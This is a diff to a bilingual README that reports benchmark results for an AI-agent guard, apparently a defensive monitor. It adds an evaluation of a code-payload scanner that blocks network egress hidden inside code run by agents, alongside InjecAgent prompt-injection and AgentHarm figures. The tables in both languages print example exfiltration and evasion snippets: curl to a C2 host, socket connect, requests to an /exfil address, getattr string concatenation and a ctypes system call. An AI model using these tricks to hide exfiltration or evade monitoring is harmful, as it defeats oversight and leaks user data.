@@ -10,6 +10,7 @@
 | Benchmark | What it measures | TPR | FPR | Verdict |
 |---|---|---|---|---|
 | **InjecAgent** (UIUC, ACL Findings 2024) | Injected tool call completes a harmful action | **91.9%** (969/1,054) | **0.0%** (0/1,054) | ✅ Valid result |
+| **Code-payload** (261 evasion payloads + 30 benign) | Code run by a code-execution tool reaches the network | **100%** (261/261) | **0.0%** (0/30) | ✅ Valid result |
 | **AgentHarm** (Gray Swan AI + UK AISI, ICLR 2025) | Agent performs a harmful task | 88.6% (156/176) | 85.2% (150/176) | ❌ No discriminative power — **negative result reported** |
 
 **Two things worth stating up front:**
@@ -77,6 +78,35 @@ The residual ~17% is where the injected tool is a **low-risk operation** (move a
 ### 3.3 Combined
 
 **1,054 cases → TPR 91.9% (969/1,054), FPR 0.0% (0/1,054).**
+
+### 3.4 Code-payload dimension — 261 evasion payloads
+
+A **code-execution tool** is where a behavior-chain engine has no visibility at all: the tool call is legitimate, the parameters are a string. Everything dangerous happens *inside* the string.
+
+We built a payload scanner and evaluated it against **261 evasion payloads** across 5 mutation modes (network egress hidden inside code), plus **30 benign code snippets** as the control.
+
+| Evasion mode | Blocked |
+|---|---|
+| `subprocess_spawn` (`subprocess.run(["curl", c2])`) | 61/61 (100%) |
+| `direct_method_call` (`socket.socket().connect(...)`) | 55/55 (100%) |
+| `http_client_call` (`requests.get("http://<ip>:<port>/exfil")`) | 54/54 (100%) |
+| `dynamic_attr_call` (`getattr(socket.socket, "c"+"on"+"nect")`) | 47/47 (100%) |
+| `runtime_symbol_call` (`ctypes.CDLL(...).system(b"curl ...")`) | 44/44 (100%) |
+| **Total (TPR)** | **261/261 = 100%** |
+
+| Benign control | Result |
+|---|---|
+| Blocked (FPR) | **0/30 = 0.0%** |
+| Downgraded to `confirm` | 3/30 = 10% — all three are legitimate HTTPS API calls |
+| Allowed outright | 27/30 = 90% |
+
+**Three design choices worth stating:**
+
+1. **The decision lives in the payload, not the tool.** Code-execution actions are rated `LOW` at the action level, so a clean script is genuinely allowed. An earlier version rated them `MEDIUM`; every benign snippet then landed on `confirm` — a 0% "FPR" that was really a 100% block.
+2. **Generic egress is not fused.** `requests.get("https://api.stripe.com/...")` is how legitimate business code works. It is downgraded to `confirm` (human hand-off), while unambiguous C2 signatures — raw IPs, `os.system`, `subprocess`+`curl`, `ctypes`+`system`, socket `connect`, `getattr` string-concatenation — are blocked.
+3. **A missing payload cannot be verified**, so code execution with no readable script is `confirm`, never `allow`.
+
+Before this dimension existed, every code-execution action fell through to the engine's unknown-action fail-closed path: **TPR 100% and FPR 100% simultaneously** — the same degeneracy as AgentHarm, and just as meaningless as a detection claim.
 
 ---
 
@@ -211,7 +241,36 @@ Datasets auto-download on first run and are cached locally. Standard library onl
 
 数据窃取 100% 的原因很直白：544 条全是 `读数据 → GmailSendEmail`，就是行为链的本命场景，与注入话术的写法无关。直接危害剩下的 17% 是「注入的工具本身是低危操作」（移动文件、退出频道），拦它反而叫误伤。
 
-## 四、AgentHarm：我们公开一个负结果
+## 四、代码 payload 维度：261 条逃逸样本
+
+代码执行工具是行为链引擎的**视野盲区**：工具调用合法、参数是个字符串，危险全在字符串里面。
+
+我们加了 payload 扫描器，用 **261 条出网逃逸 payload**（5 类变异）做正样本，**30 条良性代码**做对照：
+
+| 逃逸模式 | 拦截 |
+|---|---|
+| `subprocess_spawn`（`subprocess.run(["curl", c2])`） | 61/61（100%） |
+| `direct_method_call`（`socket.socket().connect(...)`） | 55/55（100%） |
+| `http_client_call`（`requests.get("http://<ip>:<port>/exfil")`） | 54/54（100%） |
+| `dynamic_attr_call`（`getattr(socket.socket, "c"+"on"+"nect")`） | 47/47（100%） |
+| `runtime_symbol_call`（`ctypes.CDLL(...).system(b"curl ...")`） | 44/44（100%） |
+| **合计（TPR）** | **261/261 = 100%** |
+
+| 良性对照 | 结果 |
+|---|---|
+| 误拦（FPR） | **0/30 = 0.0%** |
+| 降级为 `confirm` | 3/30 = 10%（三条全是合法 HTTPS API 调用） |
+| 直接放行 | 27/30 = 90% |
+
+**三个设计取舍（都会直接影响数字真假）：**
+
+1. **判定依据是 payload，不是工具。** 代码执行动作在动作层定为 `LOW`，干净脚本才真的能放行。早期版本定为 `MEDIUM`，结果 30 条良性代码**全部**落到「需确认」——测出来的 FPR 0% 是假的，实质是 100% 拦截。
+2. **一般出网不熔断。** `requests.get("https://api.stripe.com/...")` 是正常业务代码，降级为「需确认」（人工接管）；只有明确的 C2 特征——原始 IP、`os.system`、`subprocess`+`curl`、`ctypes`+`system`、socket `connect`、`getattr` 字符串拼接——才熔断。
+3. **拿不到 payload 就不能默认放行。** 代码执行但脚本不可读 → `confirm`，永远不给 `allow`。
+
+**这个维度建立之前**，所有代码执行动作都走未知动作 fail-closed：**TPR 100% 与 FPR 100% 同时成立**——和 AgentHarm 一模一样的退化，同样不能当检测力宣称。
+
+## 五、AgentHarm：我们公开一个负结果
 
 | | 拦截 |
 |---|---|
@@ -238,11 +297,11 @@ Datasets auto-download on first run and are cached locally. Standard library onl
 
 **对产品的一句话结论**：如果把星环当**内容过滤器**用，它在良性内容工作流上会产生约 85% 误伤——这正是为什么默认动作必须是**降级、脱敏、人工接管**，而不是硬拦。
 
-## 五、确定性
+## 六、确定性
 
 四组结果全部 SHA-256 逐字节可复现。**不可复现的安全结论无法审计，不可审计的不是证据。**
 
-## 六、自己跑
+## 七、自己跑
 
 ```bash
 python benchmarks/eval_injecagent.py   # 1,054 条：TPR + FPR
